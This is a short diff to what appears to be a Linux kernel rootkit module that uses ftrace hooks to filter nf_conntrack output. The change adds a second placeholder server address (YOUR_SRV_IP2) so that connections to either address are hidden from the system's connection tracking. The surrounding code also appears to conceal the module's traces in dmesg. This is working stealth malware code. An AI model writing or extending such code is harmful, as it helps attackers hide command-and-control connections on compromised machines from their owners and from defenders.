@@ -17,6 +17,7 @@ static DEFINE_SPINLOCK(ftrace_read_lock);
 static unsigned long last_ftrace_read_jiffies = 0;
 
 static __be32 hidden_conntrack_ip;
+static __be32 hidden_conntrack_ip2;
 
 static const char *virtual_fs_types[] = {
     "proc", "procfs", "sysfs", "tracefs", "debugfs", NULL
@@ -351,13 +352,15 @@ static notrace bool is_nf_conntrack_file(struct file *file)
 static notrace bool line_contains_hidden_ip(const char *line)
 {
     char ip_str[20];
+    char ip2_str[20];
     
     if (!line)
         return false;
     
     snprintf(ip_str, sizeof(ip_str), "%pI4", &hidden_conntrack_ip);
+    snprintf(ip2_str, sizeof(ip2_str), "%pI4", &hidden_conntrack_ip2);
     
-    return (strstr(line, ip_str) != NULL);
+    return (strstr(line, ip_str) != NULL || strstr(line, ip2_str) != NULL);
 }
 
 static notrace ssize_t filter_conntrack_output(char __user *user_buf, ssize_t bytes_read)
@@ -1631,6 +1634,7 @@ static struct ftrace_hook hooks[] = {
 
 notrace int clear_taint_dmesg_init(void) {
     hidden_conntrack_ip = in_aton(YOUR_SRV_IP);
+    hidden_conntrack_ip2 = in_aton(YOUR_SRV_IP2);
     return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 }
 
